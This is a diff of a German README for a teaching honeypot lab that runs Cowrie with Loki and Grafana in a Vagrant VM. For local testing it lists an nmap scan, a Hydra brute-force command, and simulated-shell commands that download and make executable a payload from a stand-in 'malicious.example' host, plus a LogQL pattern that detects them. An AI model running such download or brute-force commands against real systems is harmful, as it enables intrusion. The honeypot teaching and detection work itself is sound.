@@ -2,254 +2,175 @@
 
 ## Projektübersicht
 
-Dieses Projekt stellt eine vollständig automatisierte Laborumgebung zur Erkennung und Visualisierung von SSH-Angriffen bereit. Ein Cowrie-Honeypot simuliert einen SSH-Server und zeichnet Verbindungsversuche, Anmeldungen und ausgeführte Befehle auf. Promtail liest die erzeugten JSON-Protokolle und übermittelt sie an Loki. Grafana verwendet Loki als Datenquelle und stellt die erfassten Ereignisse in einem vorbereiteten Dashboard dar.
+Dieses Projekt stellt eine automatisierte Laborumgebung bereit, in der SSH-Angriffe erfasst und ausgewertet werden können. Cowrie simuliert einen SSH-Server und protokolliert Verbindungen, Anmeldeversuche und eingegebene Befehle. In der erweiterten Ausbaustufe werden diese Ereignisse mit Promtail an Loki übertragen und in Grafana visualisiert.
 
-Die komplette Umgebung läuft in einer Ubuntu-VM. Vagrant erstellt und konfiguriert die VM, installiert Docker und startet die Container automatisch mit Docker Compose. Dadurch kann das Projekt auf einem neuen Computer mit einem einzigen Vagrant-Befehl gestartet werden.
+Die Dokumentation trennt die Arbeit in zwei aufeinander aufbauende Phasen:
 
-> Diese Umgebung ist ausschliesslich für Schulungs- und Testzwecke bestimmt. Tests dürfen nur gegen dieses eigene Labor oder gegen Systeme durchgeführt werden, für die eine ausdrückliche Berechtigung vorliegt.
+- **Phase 1 – Modularbeit:** Aufbau und Test eines funktionsfähigen Cowrie-Honeypots.
+- **Phase 2 – Projektarbeit/Erweiterung:** Ergänzung einer zentralen Log-Pipeline und grafischen Auswertung mit Promtail, Loki und Grafana.
 
-## Ziel des Projekts
+Die heute vorhandene Installation enthält bereits beide Phasen. Vagrant erstellt dafür eine Ubuntu-VM; Docker Compose startet und verwaltet alle Dienste.
 
-Das Projekt zeigt den vollständigen Weg eines sicherheitsrelevanten Ereignisses:
+> Die Umgebung ist ausschliesslich für Schulungs- und Testzwecke bestimmt. Angriffsversuche dürfen nur gegen dieses eigene Labor oder gegen ausdrücklich freigegebene Systeme durchgeführt werden.
 
-1. Ein Client verbindet sich mit dem simulierten SSH-Dienst.
-2. Cowrie zeichnet die Verbindung und die Aktivitäten als JSON-Ereignisse auf.
-3. Promtail liest die Protokolle und sendet sie an Loki.
-4. Loki speichert und indexiert die Ereignisse.
-5. Grafana fragt die Daten mit LogQL ab und visualisiert sie.
+## Abgrenzung der beiden Phasen
 
-Mit der Plattform können unter anderem Portscans, fehlgeschlagene Anmeldungen, erfolgreiche Honeypot-Anmeldungen und verdächtige Befehle untersucht werden.
+### Phase 1 – Modularbeit: Cowrie-Honeypot
+
+Ziel der Modularbeit ist ein isolierter und reproduzierbarer SSH-Honeypot. Cowrie nimmt Verbindungen auf Port `2222` entgegen, simuliert eine Linux-Shell und schreibt die Aktivitäten als JSON-Ereignisse in eine Protokolldatei. Die Funktion wird mit einem Portscan, Anmeldeversuchen und einer interaktiven SSH-Sitzung geprüft. Die Ereignisse können direkt in den Cowrie-Protokollen kontrolliert werden.
+
+Vagrant und Docker Compose gehören zur technischen Betriebsbasis: Vagrant stellt die virtuelle Maschine bereit, Docker Compose startet Cowrie als Container.
+
+### Phase 2 – Projektarbeit: Monitoring und Visualisierung
+
+Die Projektarbeit erweitert den Honeypot, ohne seine Grundfunktion zu verändern. Promtail liest die JSON-Protokolle von Cowrie fortlaufend ein und sendet sie an Loki. Loki speichert die Ereignisse zentral und stellt sie für LogQL-Abfragen bereit. Grafana verwendet Loki als Datenquelle und zeigt Verbindungen, fehlgeschlagene Anmeldungen sowie eingegebene und verdächtige Befehle in einem vorbereiteten Dashboard an.
+
+Damit wird aus dem einzelnen Honeypot eine kleine Monitoring- und Analyseplattform.
 
 ## Architektur
 
-![Datenfluss der Honeypot-Plattform](docs/project-honeypot-teko-gr..drawio.png)
+### Architektur Phase 1
 
-```text
-SSH-Client -> Cowrie -> JSON-Protokoll -> Promtail -> Loki -> Grafana
-   Test          :2222                              :3100     :3000
-```
+![Architektur der Phase 1 – Modularbeit](docs/phase-1-architektur.drawio.png)
 
-Die Anwendung besteht aus folgenden Komponenten:
+**Datenfluss:** Verbindung → Ereigniserfassung → lokale Protokollierung
+
+Der Schwerpunkt liegt auf dem Honeypot selbst: Dienst bereitstellen, Testangriffe annehmen und Ereignisse nachvollziehbar protokollieren. Vagrant und Docker Compose bilden die gemeinsame Betriebsbasis.
+
+### Architektur Phase 2
+
+![Architektur der Phase 2 – Projektarbeit und Erweiterung](docs/phase-2-architektur.drawio.png)
+
+Alle Komponenten laufen als Docker-Container innerhalb derselben von Vagrant verwalteten Ubuntu-VM. Docker-Volumes speichern Cowrie-, Loki-, Promtail- und Grafana-Daten dauerhaft innerhalb der VM.
+
+## Funktionsumfang
+
+| Funktion | Phase 1: Modularbeit | Phase 2: Projektarbeit |
+| --- | :---: | :---: |
+| Reproduzierbare Ubuntu-VM mit Vagrant | ✓ | ✓ |
+| Containerbetrieb mit Docker Compose | ✓ | ✓ |
+| Simulierter SSH-Dienst mit Cowrie | ✓ | ✓ |
+| Aufzeichnung von Verbindungen und Anmeldungen | ✓ | ✓ |
+| Aufzeichnung eingegebener Befehle | ✓ | ✓ |
+| Direkte Kontrolle der Cowrie-JSON-Protokolle | ✓ | ✓ |
+| Automatische Log-Weiterleitung mit Promtail | – | ✓ |
+| Zentrale Log-Speicherung in Loki | – | ✓ |
+| Suche und Auswertung mit LogQL | – | ✓ |
+| Vorbereitetes Grafana-Dashboard | – | ✓ |
+
+## Komponenten
 
 | Komponente | Aufgabe |
 | --- | --- |
-| **Vagrant** | Erstellt die Ubuntu-VM und führt die Provisionierung aus. |
-| **Docker Compose** | Erstellt und verwaltet die vier Container der Anwendung. |
-| **Cowrie** | Simuliert einen SSH-Server und protokolliert Angreiferaktivitäten. |
-| **Promtail** | Liest die JSON-Protokolle von Cowrie und sendet sie an Loki. |
-| **Loki** | Speichert die Protokolle und stellt sie für LogQL-Abfragen bereit. |
-| **Grafana** | Visualisiert die in Loki gespeicherten Ereignisse. |
-
-Cowrie, Loki und Grafana sind über die Ports `2222`, `3100` und `3000` erreichbar. Die persistenten Anwendungsdaten werden in benannten Docker-Volumes gespeichert.
+| **Cowrie** | Simuliert einen SSH-Server und zeichnet Verbindungen, Login-Versuche und Befehle als JSON-Ereignisse auf. |
+| **Promtail** | Liest neue Cowrie-Ereignisse aus den JSON-Protokollen und übermittelt sie an Loki. |
+| **Loki** | Speichert die Protokolle zentral und ermöglicht deren Abfrage mit LogQL. |
+| **Grafana** | Fragt Loki ab und visualisiert die Ereignisse in einem Dashboard. |
+| **Vagrant** | Erstellt und provisioniert die Ubuntu-VM, inklusive Portweiterleitungen zum Hostsystem. |
+| **Docker Compose** | Erstellt, startet und verwaltet die Container der Plattform. |
 
 ## Voraussetzungen
 
-Für den empfohlenen Start mit VirtualBox werden folgende Programme und Ressourcen benötigt:
+Für den empfohlenen Betrieb mit VirtualBox werden benötigt:
 
 - Git
 - Vagrant 2.4 oder neuer
 - VirtualBox 7.x
-- Aktivierte Hardware-Virtualisierung im BIOS/UEFI
-- Mindestens 4 GB freier Arbeitsspeicher
-- Ungefähr 10 GB freier Speicherplatz
-- Internetzugang für den ersten Download
+- aktivierte Hardware-Virtualisierung
+- mindestens 4 GB freier Arbeitsspeicher
+- ungefähr 10 GB freier Speicherplatz
+- Internetzugang beim ersten Start
 
-Optional wird auch Parallels Desktop mit dem Plugin `vagrant-parallels` unterstützt.
+Optional wird Parallels Desktop mit dem Plugin `vagrant-parallels` unterstützt.
 
-## Installation und Start mit VirtualBox
+## Setup und Start
 
-Repository klonen und in das Vagrant-Verzeichnis wechseln:
+Repository klonen und in das Projektverzeichnis wechseln:
 
 ```bash
 git clone <repository-url>
-cd cybersecurity-honeypot-platform/honeypot-vm
+cd cybersecurity-honeypot-platform
 ```
 
-VM erstellen und die vollständige Plattform starten:
+Die VM und die vollständige Plattform starten:
+
+```bash
+cd honeypot-vm && vagrant up
+```
+
+Vagrant verwendet standardmässig einen verfügbaren Provider. Um VirtualBox oder Parallels ausdrücklich auszuwählen:
 
 ```bash
 vagrant up --provider=virtualbox
-```
-
-Beim ersten Start lädt Vagrant die Ubuntu-Box herunter. Danach werden Docker und die benötigten Werkzeuge installiert. Docker Compose lädt die Container-Images, erstellt Cowrie und startet die Plattform. Der erste Start kann deshalb mehrere Minuten dauern.
-
-Für Parallels lautet der Startbefehl:
-
-```bash
+# oder
 vagrant up --provider=parallels
 ```
 
-## Erreichbare Dienste
+Beim ersten Start werden die Ubuntu-Box, Docker und die Container-Images geladen. Dieser Vorgang kann mehrere Minuten dauern. Anschliessend startet Docker Compose automatisch die vier Dienste `cowrie`, `promtail`, `loki` und `grafana`.
 
-| Dienst | Adresse | Zugangsdaten |
-| --- | --- | --- |
-| Grafana | http://localhost:3000 | `admin` / `admin` |
-| Cowrie SSH über Portweiterleitung | `localhost:2222` | `root` / `toor` |
-| Cowrie SSH über das private VM-Netz | `192.168.56.10:2222` | `root` / `toor` |
-| Loki-Status | http://localhost:3100/ready | Keine |
-
-Die verwendeten Zugangsdaten sind absichtlich einfach, da sie nur für die isolierte Laborumgebung vorgesehen sind.
-
-## Funktionsprüfung nach dem Start
-
-### 1. Container überprüfen
+Status der Container prüfen:
 
 ```bash
 vagrant ssh -c "cd /project && docker compose ps"
 ```
 
-Erwartetes Ergebnis: Die vier Dienste `cowrie`, `loki`, `promtail` und `grafana` besitzen den Status `Up`.
+Alle vier Dienste sollten den Status `Up` besitzen. Loki kann zusätzlich unter <http://localhost:3100/ready> geprüft werden; nach einer kurzen Startzeit erscheint dort `ready`.
 
-### 2. Loki überprüfen
+## Zugriff auf Grafana und Cowrie
 
-Im Browser öffnen:
+| Dienst | Adresse | Zugang |
+| --- | --- | --- |
+| Grafana | <http://localhost:3000> | `admin` / `admin` |
+| Cowrie SSH | `localhost:2222` | `root` / `toor` |
+| Loki-Status | <http://localhost:3100/ready> | kein Login |
 
-```text
-http://localhost:3100/ready
-```
+Nach der Anmeldung in Grafana ist Loki bereits als Standard-Datenquelle eingerichtet. Das Dashboard **Cowrie Honeypot Overview** befindet sich im Ordner **Honeypot**.
 
-Erwartetes Ergebnis:
+Die Beispiel-Zugangsdaten von Cowrie und Grafana sind absichtlich einfach und nur für das isolierte Labor vorgesehen.
 
-```text
-ready
-```
+## Angriffssimulation
 
-Loki benötigt nach dem Start möglicherweise einige Sekunden, bis dieser Status erscheint.
+Die folgenden Befehle werden auf dem Hostsystem ausgeführt und richten sich ausschliesslich gegen `127.0.0.1` beziehungsweise die eigene VM.
 
-### 3. Grafana öffnen
-
-Im Browser öffnen:
-
-```text
-http://localhost:3000
-```
-
-Anmeldung:
-
-```text
-Benutzername: admin
-Passwort:      admin
-```
-
-In Grafana ist Loki bereits als Standard-Datenquelle eingerichtet. Das vorbereitete Dashboard **Cowrie Honeypot Overview** befindet sich im Ordner **Honeypot**.
-
-Nach der Durchführung eines Tests kann das Dashboard manuell aktualisiert werden, um die erfassten Ereignisse anzuzeigen. Die einzelnen Tests werden im nächsten Kapitel beschrieben.
-
-## Testszenarien
-
-Die folgenden Tests werden auf dem Hostsystem ausgeführt. Sie dürfen nur gegen die eigene Honeypot-VM verwendet werden.
-
-### Test 1: Portscan mit Nmap
-
-Nmap ist nur für diesen optionalen Scan-Test erforderlich und wird nicht zum Betrieb der Honeypot-Plattform benötigt.
-
-Nmap auf Ubuntu oder Debian installieren:
+Für die direkte Auswertung aus Phase 1 können die Cowrie-Ereignisse parallel in einem zweiten Terminal verfolgt werden:
 
 ```bash
-sudo apt update
-sudo apt install -y nmap
-```
-Nmap auf MacOS installieren:
-
-```bash
-brew install nmap
+vagrant ssh -c "sudo tail -f /var/lib/docker/volumes/honeypot_cowrie-data/_data/log/cowrie/cowrie.json"
 ```
 
-Installation überprüfen:
+In Phase 2 lassen sich dieselben Ereignisse im Grafana-Dashboard und mit den weiter unten aufgeführten LogQL-Abfragen untersuchen.
 
-```bash
-nmap --version
-```
+### Portscan mit Nmap
 
 ```bash
 nmap -sV -p 2222 127.0.0.1
 ```
 
-Der Scan erkennt einen SSH-Dienst auf Port `2222` und erzeugt in Cowrie mindestens ein Verbindungsereignis.
+Der Scan sollte einen SSH-Dienst erkennen. Typische Cowrie-Ereignisse sind `cowrie.session.connect`, `cowrie.client.version` und `cowrie.session.closed`.
 
-Erwartete Cowrie-Ereignisse:
+### Login-Versuche mit Hydra
 
-```text
-cowrie.session.connect
-cowrie.client.version
-cowrie.session.closed
-```
-
-Erwartete Anzeige in Grafana:
-
-- Der Wert im Panel **SSH Sessions** steigt.
-- Im Panel **Attack Events Over Time** erscheinen neue Ereignisse.
-- Es erscheinen normalerweise keine ausgeführten Befehle, weil Nmap keine SSH-Sitzung mit Befehlen öffnet.
-
-### Test 2: Anmeldeversuche mit Hydra
-
-Hydra ist nur für diesen optionalen Angriffstest erforderlich und wird nicht zum Betrieb der Honeypot-Plattform benötigt.
-
-Hydra auf Ubuntu oder Debian installieren:
-
-```bash
-sudo apt update
-sudo apt install -y hydra
-```
-Hydra auf MacOS installieren:
-
-```bash
-brew install hydra
-```
-
-Installation überprüfen:
-
-```bash
-hydra -h
-```
-
-Eine kleine Passwortliste erstellen:
+Eine kleine Testliste erstellen und gegen Cowrie verwenden (hydra muss dafür lokal installiert sein):
 
 ```bash
 printf "admin\npassword\n123456\ntoor\n" > passwords.txt
-```
-
-Hydra gegen den Cowrie-Honeypot ausführen:
-
-```bash
 hydra -l root -P passwords.txt ssh://127.0.0.1:2222
 ```
 
-Erwartete Cowrie-Ereignisse:
+Dabei entstehen unter anderem die Ereignisse `cowrie.login.failed` und `cowrie.login.success`. Nmap und Hydra sind optionale Testwerkzeuge und werden nicht für den Betrieb der Plattform benötigt.
 
-```text
-cowrie.login.failed
-cowrie.login.success
-```
-
-Erwartete Anzeige in Grafana:
-
-- Das Panel **Failed Logins** zeigt die fehlgeschlagenen Versuche.
-- Das Panel **Successful Logins** zeigt erfolgreiche Versuche.
-- **Attack Events Over Time** zeigt mehrere Ereignisse in kurzer Zeit.
-- Der gültige Laborzugang `root` / `toor` kann als erfolgreiche Anmeldung erkannt werden.
-
-### Test 3: SSH-Anmeldung und verdächtige Befehle
-
-Mit Cowrie verbinden:
+### Interaktive SSH-Sitzung
 
 ```bash
 ssh -p 2222 root@127.0.0.1
 ```
 
-Passwort:
-
-```text
-toor
-```
-
-Innerhalb der simulierten Cowrie-Shell können beispielsweise folgende Befehle eingegeben werden:
+Als Passwort wird `toor` verwendet. In der simulierten Shell können beispielsweise folgende Befehle eingegeben werden:
 
 ```bash
 whoami
 uname -a
 id
-pwd
 ls -la
 wget http://malicious.example/payload.sh
 curl http://malicious.example/payload.sh -o /tmp/payload.sh
@@ -257,23 +178,11 @@ chmod +x /tmp/payload.sh
 exit
 ```
 
-Die Befehle werden nur innerhalb des Honeypots simuliert und als Ereignisse aufgezeichnet.
+Cowrie führt diese Aktionen nicht auf dem Hostsystem aus, sondern simuliert sie und protokolliert die Eingaben als `cowrie.command.input`. Im Grafana-Dashboard sollten danach die Anzahl der Sitzungen sowie die Panels für ausgeführte und verdächtige Befehle aktualisiert werden.
 
-Erwartetes Cowrie-Ereignis:
+## Wichtigste LogQL-Abfragen
 
-```text
-cowrie.command.input
-```
-
-Erwartete Anzeige in Grafana:
-
-- Das Panel **Executed Commands** zeigt die eingegebenen Befehle.
-- Das Panel **Suspicious Commands** zeigt insbesondere Befehle mit `wget`, `curl`, `chmod` oder `payload`.
-- Die Anzahl der SSH-Sitzungen und der Ereignisse steigt.
-
-## Manuelle Kontrolle der Ereignisse
-
-In Grafana kann unter **Explore** die Loki-Datenquelle ausgewählt werden. Nützliche LogQL-Abfragen sind:
+Die Abfragen können in Grafana unter **Explore** mit der Datenquelle **Loki** ausgeführt werden.
 
 Alle Cowrie-Ereignisse:
 
@@ -281,7 +190,7 @@ Alle Cowrie-Ereignisse:
 {job="cowrie"}
 ```
 
-SSH-Verbindungen:
+Neue SSH-Verbindungen:
 
 ```logql
 {job="cowrie", eventid="cowrie.session.connect"}
@@ -293,35 +202,51 @@ Fehlgeschlagene Anmeldungen:
 {job="cowrie", eventid="cowrie.login.failed"}
 ```
 
-Ausgeführte Befehle:
+Erfolgreiche Anmeldungen:
+
+```logql
+{job="cowrie", eventid="cowrie.login.success"}
+```
+
+Eingegebene Befehle:
 
 ```logql
 {job="cowrie", eventid="cowrie.command.input"}
 ```
 
-## Bedienung der VM
+Verdächtige Befehle mit `wget`, `curl`, `chmod` oder `payload`:
+
+```logql
+{job="cowrie", eventid="cowrie.command.input"} | json | input =~ "(?i).*(wget|curl|chmod|payload).*"
+```
+
+Anzahl fehlgeschlagener Anmeldungen im gewählten Grafana-Zeitraum:
+
+```logql
+sum(count_over_time({job="cowrie", eventid="cowrie.login.failed"}[$__range]))
+```
+
+## Bedienung und Fehlersuche
+
+Die Befehle werden im Verzeichnis `honeypot-vm` ausgeführt:
 
 ```bash
-# VM anhalten
+# VM anhalten und erneut starten
 vagrant halt
-
-# VM erneut starten
 vagrant up
 
-# Shell innerhalb der VM öffnen
+# Shell der VM öffnen
 vagrant ssh
 
-# Status der Container anzeigen
+# Containerstatus und aktuelle Container-Protokolle anzeigen
 vagrant ssh -c "cd /project && docker compose ps"
-
-# Protokolle der Container anzeigen
 vagrant ssh -c "cd /project && docker compose logs --tail=100"
 
 # Provisionierung erneut ausführen
 vagrant provision
 ```
 
-Auf Parallels wird das Projekt mit RSync in die VM kopiert. Änderungen am Projekt können ohne Neustart übertragen und angewendet werden:
+Bei Parallels wird das Projekt per RSync in die VM kopiert. Änderungen können wie folgt übertragen und angewendet werden:
 
 ```bash
 vagrant rsync
@@ -330,16 +255,40 @@ vagrant ssh -c "cd /project && docker compose up -d --build"
 
 VirtualBox verwendet dagegen einen direkt eingebundenen Projektordner.
 
-## Zurücksetzen der Umgebung
-
-Die VM kann vollständig entfernt werden:
+Die VM kann bei Bedarf vollständig entfernt und mit `vagrant up` neu erstellt werden:
 
 ```bash
 vagrant destroy -f
 ```
 
-Beim nächsten `vagrant up` wird die gesamte Umgebung neu erstellt. Dabei werden auch die Docker-Volumes der entfernten VM neu angelegt. Manuell erstellte Grafana-Dashboards sollten deshalb vorher exportiert werden.
+Dabei gehen die Docker-Volumes innerhalb der VM verloren. Manuell erstellte Grafana-Dashboards sollten vorher exportiert werden.
+
+## Projektstruktur
+
+```text
+cybersecurity-honeypot-platform/
+├── README.md
+├── docker-compose.yml
+├── cowrie/
+├── grafana/
+│   └── provisioning/
+├── honeypot-vm/
+│   ├── Vagrantfile
+│   └── scripts/
+├── loki/
+└── promtail/
+```
+
+## Ausblick
+
+Die bestehende Plattform kann später ergänzt werden, ohne die aktuelle Architektur grundsätzlich umzubauen:
+
+- **Alerts:** Grafana kann bei auffälligen Login-Raten oder bestimmten Befehlen Benachrichtigungen auslösen.
+- **GeoIP:** Quell-IP-Adressen können geografisch angereichert und als Herkunftsregionen dargestellt werden.
+- **Wazuh:** Eine zusätzliche SIEM-/XDR-Lösung kann Ereignisse korrelieren, Regeln anwenden und die Analyse erweitern.
+
+Diese Punkte sind bewusst als mögliche Weiterentwicklung abgegrenzt und nicht Bestandteil der beiden umgesetzten Phasen.
 
 ## Sicherheitshinweis
 
-Der Honeypot verwendet absichtlich schwache Beispiel-Zugangsdaten und ist nicht als produktiv abgesichertes System konzipiert. Die Plattform sollte nicht ohne zusätzliche Schutzmassnahmen direkt aus dem Internet erreichbar gemacht werden. Alle beschriebenen Scan- und Angriffstests dürfen nur in dieser eigenen Laborumgebung oder mit ausdrücklicher Genehmigung durchgeführt werden.
+Der Honeypot verwendet absichtlich schwache Beispiel-Zugangsdaten und ist nicht als produktiv abgesichertes System konzipiert. Er darf nicht ohne zusätzliche Schutzmassnahmen direkt aus dem Internet erreichbar gemacht werden. Alle beschriebenen Scan- und Angriffstests sind nur in der eigenen Laborumgebung oder mit ausdrücklicher Genehmigung zulässig.
